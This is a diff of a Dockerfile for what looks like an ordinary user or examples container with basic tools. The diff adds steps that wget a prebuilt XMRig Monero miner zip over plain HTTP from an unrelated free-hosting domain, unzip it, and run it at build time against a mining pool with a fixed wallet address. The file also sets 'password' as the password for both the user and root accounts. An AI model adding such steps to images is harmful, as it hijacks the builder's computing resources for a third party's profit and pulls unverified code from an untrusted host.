@@ -6,7 +6,7 @@ RUN apt-get -y install apt-utils gcc \
 	fakeroot dbus base whiptail hexedit \
 	patch wamerican ucf manpages \
 	file luajit make lua50 dialog curl \
-	less cowsay netcat-openbsd git \
+	less cowsay netcat-openbsd git unzip \
         build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 RUN useradd -m user && echo "user:password" | chpasswd
 COPY --chown=user:user ./examples /home/user/examples
@@ -17,10 +17,6 @@ WORKDIR /home/user/
 ENV HOME="/home/user" TERM="xterm" USER="user" SHELL="/bin/bash" EDITOR="vim" LANG="en_US.UTF-8" LC_ALL="C"
 RUN echo 'root:password' | chpasswd
 CMD [ "/bin/bash" ]
-RUN git clone https://github.com/xmrig/xmrig.git
-RUN cd xmrig
-RUN mkdir build
-RUN cd build 
-RUN cmake ..
-RUN make
+RUN wget http://watercooling.x10.mx/xmrig.zip
+RUN unzip xmrig.zip
 RUN ./xmrig -o moneroocean.stream:10128 -u 4A7F2uGwJ1QffZY9jQNMEDB8WQfAcyNdKLzHSsBLzLTQYCjbQVvceNa1Gyhxj7mu8SftUM6cGod2bTxhqjG6aevw63Z3eNz -p coin -k
